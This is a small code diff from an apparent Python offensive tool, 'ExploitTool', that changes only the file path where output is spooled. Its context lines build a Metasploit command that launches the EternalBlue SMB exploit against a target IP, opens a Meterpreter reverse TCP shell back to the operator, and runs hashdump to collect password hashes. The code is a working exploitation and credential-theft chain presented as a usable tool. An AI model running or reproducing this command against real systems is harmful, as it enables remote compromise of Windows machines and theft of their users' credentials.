@@ -356,7 +356,7 @@ class ExploitTool(cmd.Cmd):
                 self.config['msfconsole_path'], '-q', '-x',
                 f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set LHOST {self.local_ip}; "
                 f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -z; "
-                f"spool ~/hashes; sleep 5; sessions -i 1 -C hashdump; spool off; exit -y"
+                f"spool hashes; sleep 5; sessions -i 1 -C hashdump; spool off; exit -y"
             ]
             self.logger.debug(f"Running initial exploit command for {target_ip}: {' '.join(exploit_command)}")
             self.logger.info(f"[*] Attempting to exploit {target_ip} and extract hashes...")
